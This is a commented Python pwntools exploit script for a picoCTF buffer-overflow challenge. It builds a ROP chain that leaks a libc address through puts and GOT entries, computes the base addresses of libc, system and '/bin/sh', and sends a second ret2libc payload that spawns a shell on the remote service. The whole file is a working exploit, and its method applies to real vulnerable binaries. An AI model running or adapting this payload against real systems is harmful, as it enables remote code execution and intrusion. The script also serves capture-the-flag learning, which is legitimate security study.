#!/usr/bin/env python3

from pwn import *

# p = process('./vuln') # start the vulnerable program process
 
# we reached EOF (End Of File) with our payload
# gdb.attach(p) # debug our ROPchain

p = remote('mercury.picoctf.net', 37289)

offset = 136 # we discovered that with 'pattern offset $rsp'
junk = b"A" * offset # creating our payload that will overflow

# where do we jumpt to since we cant execute it off the stack
# way to print out the address

"""
Plan to leak an address:
- use puts
- supply arguments to puts
- we will use ROP to do this:
	but will need the x64 calling conventions
- that means the register 'rdi' is the first argument
	we want to find a ropgadget that modifies (like a mov or pop) the rdi 
"""

pop_rdi = 0x400913 # 0x0000000000400913 : pop rdi ; ret (`ROPgadget --bin vuln`)
# scanf_at_got = 0x601038 # DAT_00601038, address of .got.plt section of the scanf function in ghidra
# puts_at_got = 0x601018 # same as the scanf_at_got, but we changed the function to leak the address
setbuf_at_got = 0x601028 # same as the above, but we changed the function once again to leak the address

puts_at_plt = 0x400540 # 00400540, address of .plt section of the puts function in ghidra
back_to_main = 0x400771 # 00400771, addres of main in ghidra

payload = [
	junk, # junk to overflow
	# call puts to leak the true scanf address
	p64(pop_rdi), # packs the integers into bytes (returns a 64-bit little-endian byte string representation as a hexadecimal-encoded string)
	p64(setbuf_at_got), # address we want to leak
	p64(puts_at_plt), # callpoint
	p64(back_to_main) # jump back to main, so that it won't crash after we leak the address
]

payload = b''.join(payload) # mix all those variables in the payload list and transforms everything in bytes
p.sendline(payload) # send payload

# to get the leaked address
p.recvline()
p.recvline()

# unpack it and save the leak address, strip the \n, and adjusts the string padded with 8 bytes 
# and suffix it with null bytes and turn it into hexadecimal
leak = u64(p.recvline().strip().ljust(8, b"\x00")) 

log.info(f"{hex(leak)=}") # get the leaked address

"""
Plan to calculate the offset (getting the difference between the leaked address and the system address)
between scanf (function we leaked) and system (function we want to call )

`readelf -s ./libc.so.6 | grep scanf` (print the address of scanf)
2062: 000000000007b0b0   197 FUNC    GLOBAL DEFAULT   13 scanf@@GLIBC_2.2.5
"""
# scanf_offset = 0x7b0b0

"""
we changed the function from scanf to puts
`readelf -s ./libc.so.6 | grep puts` (print the address of puts)
422: 0000000000080a30   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
"""
# puts_offset = 0x80a30

"""
we changed from puts to setbuf
`readelf -s ./libc.so.6 | grep setbuf` (prints the address of setbuf)
2185: 0000000000088540    10 FUNC    GLOBAL DEFAULT   13 setbuf@@GLIBC_2.2.5
"""
setbuf_offset = 0x88540

# Now we take our leaked address and subtract 0x7b0b0, and then we find the actual loaded address of libc
base_address_of_libc = leak - setbuf_offset

log.info(f"{hex(base_address_of_libc)=}") # check if everything is right in our ROPchain, we could see that it isn't leaking right

"""
calcule the address of function system

`readelf -s ./libc.so.6 | grep system`
1403: 000000000004f4e0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
"""
system_offset = 0x4f4e0
system_address = base_address_of_libc + system_offset # get the actual physical in memory address of system

"""
check if /bin/sh is in libc.so.6
`strings libc.so.6 | grep /bin/sh`, check there is
"""

"""
open libc.so.6 in ghidra (don't scan it)
search memory (press s), change Format from hex to string and search for /bin/sh
002b40fa
"""
bin_sh_offset = 0x1b40fa # it was 0x2b40fa, +100000 because of ghidra had a base address of 0x100000 (thats why its +100000)
bin_sh_address = base_address_of_libc + bin_sh_offset

ret_instruction = 0x40052e # `ROPgadget --binary vuln | grep -i ": ret"` (searching for ret intructions)

# second ROPchain (payload), now that its waiting to receive input

second_payload = [
	junk, # get back to the offset, where we know our instruction pointer will end up going, buffer overflow
	p64(pop_rdi), # supply an argument to a function that we end up calling, system 
	p64(bin_sh_address), # string to /bin/sh
	p64(ret_instruction), # so that whenever we call a sytem function, the last digit is a 0, basically for stack allignment
	p64(system_address), # passing that to system
]

# prepare our second payload
second_payload = b''.join(second_payload)
p.sendline(second_payload)


p.interactive()
